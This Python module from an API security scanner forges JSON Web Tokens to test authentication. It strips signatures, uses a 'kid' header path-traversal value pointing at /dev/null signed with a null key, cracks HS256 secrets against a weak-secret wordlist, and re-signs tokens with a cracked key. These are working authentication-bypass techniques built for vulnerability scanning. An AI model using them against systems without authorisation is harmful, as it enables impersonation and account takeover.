"""Stdlib-only JWT forging for the auth check's JWT attacks (OWASP API2).

Checks only *generate* these tokens; the analyzer decides findings (accepted probe
resembles the authenticated baseline -> firm). No third-party JWT library: everything
here is base64 / json / hmac / hashlib so apifuzz keeps zero crypto dependencies.
"""
import base64
import hashlib
import hmac
import json
import time
from collections.abc import Iterable
from functools import lru_cache
from pathlib import Path
from typing import Any

_WORDLIST = Path(__file__).parent / "jwt_secrets.txt"
KID_TRAVERSAL = "../../../../../../dev/null"  # points kid at an empty file; HMAC key becomes b"\x00"
_NULL_KEY = b"\x00"                           # base64 "AA=="


def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def _b64url_decode(part: str) -> bytes:
    return base64.urlsafe_b64decode(part + "=" * (-len(part) % 4))


def _decode(part: str) -> dict[str, Any] | None:
    try:
        obj = json.loads(_b64url_decode(part))
        return obj if isinstance(obj, dict) else None
    except Exception:
        return None


def is_jwt(token: str) -> bool:
    """Three dot-separated parts whose header decodes to a JSON object with an `alg`."""
    parts = token.split(".")
    if len(parts) != 3:
        return False
    header = _decode(parts[0])
    return header is not None and "alg" in header


def decode_header(token: str) -> dict[str, Any] | None:
    return _decode(token.split(".")[0]) if token.count(".") == 2 else None


def decode_payload(token: str) -> dict[str, Any] | None:
    return _decode(token.split(".")[1]) if token.count(".") == 2 else None


def _signing_input(header: dict[str, Any], payload: dict[str, Any]) -> bytes:
    # Compact separators so the encoded form matches what we sign/verify.
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}".encode()


def _sign(header: dict[str, Any], payload: dict[str, Any], key: bytes,
          digest: Any = hashlib.sha256) -> str:
    signing = _signing_input(header, payload)
    sig = hmac.new(key, signing, digest).digest()
    return f"{signing.decode()}.{_b64url(sig)}"


def forge_unsigned(token: str) -> str:
    """Same header and claims, signature replaced with a fixed garbage value.
    Tests whether the server verifies the signature at all."""
    parts = token.split(".")
    if len(parts) != 3:
        return token
    return f"{parts[0]}.{parts[1]}.{_b64url(b'apifuzz-invalid-signature')}"


def forge_kid_traversal(token: str) -> str:
    """Header kid -> path traversal to an empty file, signed HMAC-SHA256 with b'\\x00'.
    If the server resolves `kid` to a file and uses its (empty/null) contents as the key,
    this signature verifies. Reuses the original claims."""
    payload = decode_payload(token)
    if payload is None:
        return token
    header = {"alg": "HS256", "typ": "JWT", "kid": KID_TRAVERSAL}
    return _sign(header, payload, _NULL_KEY)


def crack_hs256(token: str, candidates: Iterable[str]) -> str | None:
    """Offline (zero requests): return the first candidate secret whose HMAC-SHA256 matches
    the token's signature, or None. Only for HS256 tokens."""
    parts = token.split(".")
    if len(parts) != 3:
        return None
    header = _decode(parts[0])
    if header is None or header.get("alg") != "HS256":
        return None
    signing = f"{parts[0]}.{parts[1]}".encode()
    try:
        target = _b64url_decode(parts[2])
    except Exception:
        return None
    for secret in candidates:
        if hmac.compare_digest(hmac.new(secret.encode(), signing, hashlib.sha256).digest(), target):
            return secret
    return None


def resign_hs256(token: str, key: str, *, expired: bool = False) -> str:
    """Re-sign the token's claims with a known HS256 `key`, keeping identity. Refreshes
    time claims: a valid future `exp` (expired=False) or a past `exp` (expired=True)."""
    header = decode_header(token) or {"typ": "JWT"}
    payload = dict(decode_payload(token) or {})
    header = {**header, "alg": "HS256"}
    now = int(time.time())
    if "iat" in payload:
        payload["iat"] = now
    if "nbf" in payload:
        payload["nbf"] = now
    if expired:
        payload["exp"] = now - 3600          # an hour in the past
    elif "exp" in payload:
        payload["exp"] = now + 3600          # keep it currently valid
    return _sign(header, payload, key.encode())


@lru_cache(maxsize=1)
def load_default_wordlist() -> tuple[str, ...]:
    """Bundled weak-secret list (see jwt_secrets.README.md), loaded once."""
    try:
        text = _WORDLIST.read_text(encoding="utf-8")
    except OSError:
        return ()
    return tuple(line for line in text.splitlines() if line)


if __name__ == "__main__":  # ponytail: one runnable self-check, no framework
    def _payload(t: str) -> dict[str, Any]:
        p = decode_payload(t)
        assert p is not None
        return p

    tok = _sign({"alg": "HS256", "typ": "JWT"}, {"sub": "1", "exp": 1, "iat": 1}, b"random")
    assert is_jwt(tok) and _payload(tok)["sub"] == "1"
    assert crack_hs256(tok, ["nope", "random", "x"]) == "random"       # hit
    assert crack_hs256(tok, ["nope", "x"]) is None                     # miss
    rs = resign_hs256(tok, "random")
    assert crack_hs256(rs, ["random"]) == "random" and _payload(rs)["exp"] > time.time()
    ex = resign_hs256(tok, "random", expired=True)
    assert _payload(ex)["exp"] < time.time()
    kid = forge_kid_traversal(tok)
    header = decode_header(kid)
    assert header is not None and header["kid"] == KID_TRAVERSAL
    assert crack_hs256(kid, ["\x00"]) == "\x00"                        # signed with null key
    assert forge_unsigned(tok).rsplit(".", 1)[1] != tok.rsplit(".", 1)[1]
    assert "random" in load_default_wordlist()
    print("ok")
